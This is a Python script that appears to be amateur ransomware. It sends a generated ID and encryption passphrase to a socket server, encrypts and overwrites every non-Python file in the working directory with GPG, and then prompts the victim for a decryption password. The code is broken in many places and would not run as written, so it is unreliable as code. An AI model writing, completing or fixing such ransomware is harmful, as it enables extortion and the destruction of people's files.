import gnupg,base64
import sys
import socket
import string
import random
import os

x = 0

temp = open("temp.txt", "wb")

gpg = gnupg.GPG()

ID = random.randint(1,1000000) # generate unique ID's
passphrase1 = random.randint(10000000000000,1000000000000000000000000) # generate a random long password

toSend = ID + " " + passphrase1

### FUNCTIONS ###

#outgoing socket listener
def socketConnect():
	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client_socket.connect(('localhost', 5469)) # connect to server on port 5469
	
	client_socket.send(toSend) # sends the passphrase and ID to our socket server
	
	data = client_socket.recv(512)
	
	while data = 'Bad ID':
		ID = random.randint(1,1000000)
		client_socket.send(ID)
		data = client_socket.recv(512)
		
	else client_socket.close()
	break;
	

# encrypt function
def encrypt(passphrase, message, currentFile):
   cipher = gpg.encrypt(message, recipients=None, symmetric='AE256', passphrase=passphrase, armor=True)
   return base64.b64encode( str(cipher) )
   temp = cipher # writes the new encrypted data to temp string

   write1 = open(currentFile, 'wb') # reopen the file to encrypt
   write1.write(temp) # overwrite file with the encrypted contents

# decrypt function   
def decrypt(passphrase):
    for i in os.listdir(os.getcwd()):
		decrypt = open(i, 'rb')
		for line in decrypt:
			deciphered = str( gpg.decrypt( base64.b64decode(line), passphrase ) )
			if deciphered is True:
				i.close()
				decrypt.close()

				crypt = open(i, 'wb')
				crypt.close()

			else 'Incorrect passphrase'
			
#### MAIN BODY ####
while 1:
	socketConnect() # connect to host
	# get latest info on our ID
	for i in os.listdir(os.getcwd()): # on first run of the program, loop through root directory encrypting
		if i.endswith(".py"): # skip over python files
			continue
		else:
			file = open(i, 'rb'): # every file we iterate through is assigned to i
			for line in file:
				content = line # read each line in content string
				
			print ("FULLY ENCRYPTED \n")
			print ("ID = " + ID)
			
			file.close() # close the file we're encrypting
			
			encrypt(passphrase1, content, i)
			continue
	while 1:   # main menu to decrypt from
		option = input("'D'ecrypt to decrypt your disk with a supplied password: ")
		
		if option == 'D':	
			passphrase2 = input("Enter the password to decrypt with: ")
			decrypt(passphrase2)
			
		else print ("Invalid!")